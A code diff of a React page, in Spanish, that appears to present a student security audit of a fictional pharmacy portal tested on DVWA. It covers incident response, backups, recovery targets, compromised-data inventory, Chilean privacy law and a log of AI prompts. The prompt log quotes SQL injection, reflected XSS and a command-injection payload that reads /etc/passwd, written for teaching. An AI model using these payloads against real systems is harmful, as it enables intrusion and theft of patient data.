+      <p>
+        <strong>Fase 2 — Mitigación Web (primeras 72 horas):</strong>
+      </p>
+      <p>
+        Aplicar codificación de salida HTML (<code>htmlspecialchars()</code>) en todos los
+        campos que reflejan input del usuario para eliminar la superficie de ataque XSS.
+        Implementar cabeceras HTTP de seguridad:{' '}
+        <code>Content-Security-Policy</code>, <code>X-XSS-Protection</code>,{' '}
+        <code>X-Content-Type-Options</code> y <code>Strict-Transport-Security</code>.
+        Rotar claves de API y secretos de sesión del portal.
+      </p>
+      <br />
+      <p>
+        <strong>Fase 3 — Revisión General (primeros 7 días):</strong>
+      </p>
+      <p>
+        Auditoría completa de código fuente con herramienta SAST (Static Application Security
+        Testing). Revisión de dependencias con <code>npm audit</code> /{' '}
+        <code>composer audit</code>. Análisis forense de logs del servidor para determinar qué
+        datos fueron exfiltrados, desde cuándo y por qué vectores. Eliminar cualquier webshell o
+        backdoor instalado durante el período de compromiso.
+      </p>
+    </div>
+
+    {/* CARD 3 — PROTOCOLO IR */}
+    <div className="cod-card">
+      <h3>3. PROTOCOLO DE RESPUESTA A INCIDENTES (IR)</h3>
+      <div style={{ overflowX: 'auto' }}>
+        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.9rem', tableLayout: 'fixed' }}>
+          <colgroup>
+            <col style={{ width: '15%' }} />
+            <col style={{ width: '45%' }} />
+            <col style={{ width: '25%' }} />
+            <col style={{ width: '15%' }} />
+          </colgroup>
+          <thead>
+            <tr style={{ backgroundColor: 'var(--cod-bg-dark)', color: '#fff' }}>
+              <th style={{ padding: '10px', textAlign: 'left' }}>ETAPA</th>
+              <th style={{ padding: '10px', textAlign: 'left' }}>ACCIÓN</th>
+              <th style={{ padding: '10px', textAlign: 'left' }}>RESPONSABLE</th>
+              <th style={{ padding: '10px', textAlign: 'left' }}>PLAZO</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
+              <td style={{ padding: '10px' }}><strong>Detección</strong></td>
+              <td style={{ padding: '10px' }}>Alerta WAF / SIEM activa ante patrones de inyección</td>
+              <td style={{ padding: '10px' }}>Equipo de Seguridad</td>
+              <td style={{ padding: '10px' }}><span style={{ color: 'var(--cod-critico)', fontWeight: 'bold' }}>{'< 1 hora'}</span></td>
+            </tr>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
+              <td style={{ padding: '10px' }}><strong>Contención</strong></td>
+              <td style={{ padding: '10px' }}>Aislamiento de red del servidor comprometido + revocación de tokens</td>
+              <td style={{ padding: '10px' }}>Infraestructura</td>
+              <td style={{ padding: '10px' }}><span style={{ color: 'var(--cod-critico)', fontWeight: 'bold' }}>{'< 2 horas'}</span></td>
+            </tr>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
+              <td style={{ padding: '10px' }}><strong>Erradicación</strong></td>
+              <td style={{ padding: '10px' }}>Deploy desde rama <code>hotfix/security-patch</code> en Git</td>
+              <td style={{ padding: '10px' }}>Desarrollo</td>
+              <td style={{ padding: '10px' }}><span style={{ color: 'var(--cod-alto)', fontWeight: 'bold' }}>{'< 4 horas'}</span></td>
+            </tr>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
+              <td style={{ padding: '10px' }}><strong>Recuperación</strong></td>
+              <td style={{ padding: '10px' }}>Restauración de BD desde último backup íntegro verificado</td>
+              <td style={{ padding: '10px' }}>DBA</td>
+              <td style={{ padding: '10px' }}><span style={{ color: 'var(--cod-alto)', fontWeight: 'bold' }}>{'< 6 horas'}</span></td>
+            </tr>
+            <tr>
+              <td style={{ padding: '10px' }}><strong>Post-Incidente</strong></td>
+              <td style={{ padding: '10px' }}>Informe forense + notificación legal a afectados</td>
+              <td style={{ padding: '10px' }}>Seguridad + Legal</td>
+              <td style={{ padding: '10px' }}><span style={{ color: 'var(--cod-safe)', fontWeight: 'bold' }}>{'< 72 horas'}</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    {/* CARD 4 — RTO / RPO */}
+    <div className="cod-card">
+      <h3>4. OBJETIVOS DE RECUPERACIÓN — RTO / RPO</h3>
+      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.5rem', marginTop: '0.5rem' }}>
+        <div style={{
+          border: '2px solid var(--cod-critico)',
+          padding: '20px',
+          backgroundColor: 'rgba(225, 29, 72, 0.05)'
+        }}>
+          <p style={{ fontFamily: 'monospace', fontSize: '0.8rem', color: 'var(--cod-critico)', marginBottom: '8px' }}>
+            // RTO — RECOVERY TIME OBJECTIVE
+          </p>
+          <p style={{ fontSize: '2rem', fontFamily: 'Impact', color: 'var(--cod-bg-dark)', margin: '0 0 8px' }}>
+            ≤ 4 HORAS
+          </p>
+          <p style={{ fontSize: '0.85rem' }}>
+            Tiempo máximo tolerable para restablecer el Portal de Clientes y el acceso a
+            recetas médicas digitales tras un incidente crítico confirmado.
+          </p>
+        </div>
+        <div style={{
+          border: '2px solid var(--cod-alto)',
+          padding: '20px',
+          backgroundColor: 'rgba(245, 158, 11, 0.05)'
+        }}>
+          <p style={{ fontFamily: 'monospace', fontSize: '0.8rem', color: 'var(--cod-alto)', marginBottom: '8px' }}>
+            // RPO — RECOVERY POINT OBJECTIVE
+          </p>
+          <p style={{ fontSize: '2rem', fontFamily: 'Impact', color: 'var(--cod-bg-dark)', margin: '0 0 8px' }}>
+            ≤ 1 HORA
+          </p>
+          <p style={{ fontSize: '0.85rem' }}>
+            Pérdida máxima de datos aceptable. Los respaldos automáticos de la base de datos
+            de pacientes deben ejecutarse cada 60 minutos en ambiente de producción.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    {/* CARD 5 — ESTRATEGIA DE RESPALDO */}
+    <div className="cod-card">
+      <h3>5. ESTRATEGIA DE RESPALDO Y CONTINUIDAD OPERATIVA</h3>
+      <p>
+        <strong>Política de Backups:</strong> Respaldos automáticos diarios completos de la base
+        de datos de pacientes y recetas, cifrados con <strong>AES-256</strong>, almacenados en un
+        servidor externo geográficamente separado. Respaldos incrementales cada hora durante el
+        horario de operación (08:00–22:00). Los respaldos deben ser probados mensualmente
+        mediante restauración en entorno de staging.
+      </p>
+      <br />
+      <p>
+        <strong>Alta Disponibilidad:</strong> Implementar arquitectura de servidor en espera
+        (Standby/Failover) para el portal. Ante caída del servidor primario, el tráfico se
+        redirige automáticamente al nodo secundario en un plazo máximo de <strong>5 minutos</strong>{' '}
+        mediante balanceo de carga.
+      </p>
+      <br />
+      <p>
+        <strong>Entorno de Recuperación:</strong> Mantener un entorno de staging permanentemente
+        actualizado con la última versión de código seguro, listo para ser promovido a producción
+        en caso de incidente crítico sin necesidad de tiempo de desarrollo adicional.
+      </p>
+    </div>
+
+    {/* CARD 6 — DATOS COMPROMETIDOS */}
+    <div className="cod-card">
+      <h3>6. INVENTARIO DE DATOS COMPROMETIDOS EN FARMASALUD</h3>
+      <p>Basado en la evidencia técnica de las capturas de los ataques ejecutados:</p>
+      <br />
+      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
+        <div style={{ borderLeft: '4px solid var(--cod-critico)', paddingLeft: '12px' }}>
+          <p style={{ fontWeight: 'bold', color: 'var(--cod-critico)', marginBottom: '6px' }}>VÍA SQLI</p>
+          <p>• Nombres y apellidos de pacientes</p>
+          <p>• Historial de recetas médicas</p>
+          <p>• Datos del programa de fidelización</p>
+          <p>• Credenciales de acceso al portal</p>
+        </div>
+        <div style={{ borderLeft: '4px solid var(--cod-critico)', paddingLeft: '12px' }}>
+          <p style={{ fontWeight: 'bold', color: 'var(--cod-critico)', marginBottom: '6px' }}>VÍA COMMAND INJECTION</p>
+          <p>• Archivo <code>/etc/passwd</code> completo</p>
+          <p>• Usuarios del sistema: root, www-data, mysql</p>
+          <p>• Estructura del sistema operativo del servidor</p>
+          <p>• Posible acceso a archivos de configuración</p>
+        </div>
+        <div style={{ borderLeft: '4px solid var(--cod-alto)', paddingLeft: '12px' }}>
+          <p style={{ fontWeight: 'bold', color: 'var(--cod-alto)', marginBottom: '6px' }}>VÍA XSS</p>
+          <p>• Cookies de sesión de clientes activos</p>
+          <p>• Tokens de autenticación del portal</p>
+          <p>• Datos de navegación del usuario</p>
+        </div>
+        <div style={{ borderLeft: '4px solid var(--cod-safe)', paddingLeft: '12px' }}>
+          <p style={{ fontWeight: 'bold', color: 'var(--cod-safe)', marginBottom: '6px' }}>ACCIÓN REQUERIDA</p>
+          <p>• Notificar a todos los pacientes registrados</p>
+          <p>• Forzar cambio de contraseñas en el portal</p>
+          <p>• Invalidar todas las sesiones activas</p>
+        </div>
+      </div>
+    </div>
+
+    {/* CARD 7 — LEY 19.628 */}
+    <div className="cod-card">
+      <h3>7. OBLIGACIONES LEGALES — LEY N° 19.628 (CHILE)</h3>
+      <p>
+        FarmaSalud opera en el sector salud procesando <strong>datos personales sensibles</strong>{' '}
+        (recetas médicas, patologías implícitas, datos financieros de pacientes). Ante una
+        filtración confirmada, las obligaciones legales son:
+      </p>
+      <br />
+      <p>
+        <strong>Notificación a afectados:</strong> Informar a los titulares de datos
+        comprometidos dentro de <strong>72 horas</strong> desde la confirmación del incidente,
+        indicando qué datos fueron expuestos y qué medidas se adoptaron.
+      </p>
+      <br />
+      <p>
+        <strong>Registro del incidente:</strong> Documentar fecha y hora del incidente,
+        categoría y volumen de datos comprometidos, medidas de contención adoptadas e identidad
+        del responsable del tratamiento.
+      </p>
+      <br />
+      <p>
+        <strong>Responsabilidad por omisión de controles:</strong> La ausencia de controles
+        básicos como Prepared Statements y sanitización de inputs puede constituir incumplimiento
+        del deber de seguridad exigido por la ley, exponiendo a FarmaSalud a sanciones
+        administrativas y acciones civiles por parte de los pacientes afectados.
+      </p>
+    </div>
+  </div>
+)}
+
 
           {/* 09 BITÁCORA DE IA & REPO */}
           {seccionActiva === 'prompts' && (
             <div className="animate-fade">
-              <h2>09 // BITÁCORA DE ASISTENCIA IA & DEPLOY-OPS</h2>
+              <h2 className="cyber-title">09 // BITÁCORA DE ASISTENCIA IA & DEPLOY-OPS</h2>
               
               <div className="cod-card">
-                <h3>ANÁLISIS DE DESARROLLO ASISTIDO POR IA</h3>
-                <p>En creacion..</p>
+                <h3>RESUMEN EJECUTIVO</h3>
+                <p>Este documento detalla el uso de herramientas de Inteligencia Artificial para la investigación, estructuración y redacción de los componentes clave de la auditoría de seguridad web de FarmaSalud.</p>
+              </div>
+
+              <div className="cod-card">
+                <h3>01_resumen_grocat.md</h3>
+                <p><strong>Prompt del usuario:</strong> <em>"Hazme un resumen ejecutivo para una auditoría de seguridad web de FarmaSalud, una cadena de farmacias que opera un portal de clientes con recetas médicas digitales y programa de fidelización."</em></p>
+                <p><strong>Resultado de la IA:</strong> La IA ayudó a estructurar el contexto de la empresa, describir el alcance del portal de clientes y redactar una introducción clara orientada al negocio farmacéutico.</p>
+              </div>
+
+              <div className="cod-card">
+                <h3>02_sqli_grocat.md</h3>
+                <p><strong>Prompt del usuario:</strong> <em>"Explícame por qué funciona la Inyección SQL con el payload ' OR '1'='1 en DVWA, cuál sería su impacto en FarmaSalud y cómo calcular su severidad CVSS v3.1."</em></p>
+                <p><strong>Resultado de la IA:</strong> La IA explicó el mecanismo de concatenación vulnerable, propuso el vector CVSS base y describió el impacto en términos de filtración de datos de pacientes y recetas médicas.</p>
+              </div>
+
+              <div className="cod-card">
+                <h3>03_xss_grocat.md</h3>
+                <p><strong>Prompt del usuario:</strong> <em>"Explícame cómo funciona el XSS Reflejado con &lt;script&gt;alert('XSS')&lt;/script&gt; en DVWA, qué riesgo representa para los clientes de FarmaSalud y cuál es su puntaje CVSS v3.1."</em></p>
+                <p><strong>Resultado de la IA:</strong> La IA colaboró en la explicación técnica del fallo de codificación de salida, el vector de ataque mediante enlace malicioso y el impacto en el robo de sesiones del programa de fidelización.</p>
+              </div>
+
+              <div className="cod-card">
+                <h3>04_comandos_grocat.md</h3>
+                <p><strong>Prompt del usuario:</strong> <em>"Explícame la Inyección de Comandos con 127.0.0.1; cat /etc/passwd en DVWA, su impacto en el servidor de FarmaSalud y su vector CVSS v3.1."</em></p>
+                <p><strong>Resultado de la IA:</strong> La IA apoyó en la explicación del uso de separadores de shell, el riesgo de toma de control del servidor y la justificación de las métricas de confidencialidad, integridad y disponibilidad en el puntaje CVSS.</p>
+              </div>
+
+              <div className="cod-card">
+                <h3>05_activos_grocat.md</h3>
+                <p><strong>Prompt del usuario:</strong> <em>"Genera un inventario de activos críticos para FarmaSalud con valoración de Confidencialidad, Integridad y Disponibilidad, considerando que opera un portal con recetas médicas y datos de pago."</em></p>
+                <p><strong>Resultado de la IA:</strong> La IA ayudó a identificar y clasificar los activos de datos, software e infraestructura, y a justificar su valoración C-I-D según el rubro farmacéutico y las normativas aplicables.</p>
+              </div>
+
+              <div className="cod-card">
+                <h3>06_matriz_grocat.md</h3>
+                <p><strong>Prompt del usuario:</strong> <em>"Construye una matriz de riesgo probabilidad × impacto para las tres vulnerabilidades de FarmaSalud: SQLi, XSS y Command Injection. Ubícalas en la matriz y justifica su posición."</em></p>
+                <p><strong>Resultado de la IA:</strong> La IA colaboró en el diseño de la tabla de riesgos, la asignación de niveles de probabilidad e impacto y la redacción de los escenarios de amenaza para cada vulnerabilidad.</p>
+              </div>
+
+              <div className="cod-card">
+                <h3>07_controles_grocat.md</h3>
+                <p><strong>Prompt del usuario:</strong> <em>"Propón controles de mitigación concretos para SQLi, XSS y Command Injection en FarmaSalud, referenciando OWASP Top 10 y NIST SP 800-53."</em></p>
+                <p><strong>Resultado de la IA:</strong> La IA apoyó en la estructuración del cuadro de controles, describiendo medidas preventivas, detectivas y correctivas, y asociándolas a los marcos de referencia solicitados.</p>
+              </div>
+
+              <div className="cod-card">
+                <h3>08_recuperacion_grocat.md</h3>
+                <p><strong>Prompt del usuario:</strong> <em>"Genera un plan de recuperación ante desastres para FarmaSalud en caso de explotación de las vulnerabilidades encontradas, con fases de contención, erradicación y post-incidente."</em></p>
+                <p><strong>Resultado de la IA:</strong> La IA colaboró en la redacción del protocolo de respuesta a incidentes, incluyendo el aislamiento de red, restauración desde respaldos y notificación legal a los afectados.</p>
+              </div>
+
+              <div className="cod-card">
+                <h3>Diseño de Componentes React y Sitio Web</h3>
+                <p><strong>Prompt del usuario:</strong> <em>"Genera un componente React con Tailwind CSS que represente un mapa de calor 5×5 de riesgo (Probabilidad × Impacto) con celdas rojas, amarillas y verdes según el nivel de riesgo. Agrega una tabla inferior que muestre el detalle del riesgo al hacer clic en cada marcador."</em></p>
+                <p><strong>Resultado de la IA:</strong> La IA apoyó en la generación del código base del componente visual, la estructura del sidebar de navegación y la organización del layout general del sitio en React.</p>
               </div>
 
               <div className="cod-card command-center-card">
                 <h3>DATOS DEL CREADOR</h3>
                 <div className="visor-row"><strong>ID USUARIO:</strong> <span className="highlight-orange">cgrohmann5</span></div>
-                <div className="visor-row"><strong>NOMBRE:</strong> <span className="highlight-orange">Catalina Grohmann</span></div> {/* <--- AGREGA ESTA LÍNEA */}
+                <div className="visor-row"><strong>NOMBRE:</strong> <span className="highlight-orange">Catalina Grohmann</span></div>
                 <div className="visor-row"><strong>ESTADO DEL REPOSITORIO:</strong> <span className="status-planned">VERIFICADO</span></div>
+                <div className="visor-row"><strong>ESTADO OPERATIVO:</strong> <span className="status-planned">SECURE-OPS // REPO_VERIFIED</span></div>
                 
                 {/* INTERFAZ DEL BOTÓN TÁCTICO INTEGRADA */}
                 <div className="github-action-wrapper">
@@ -598,9 +939,8 @@ export default function Matriz() {
               </div>
             </div>
           )}
-
         </main>
       </div>
     </div>
-  );
+  )
 }
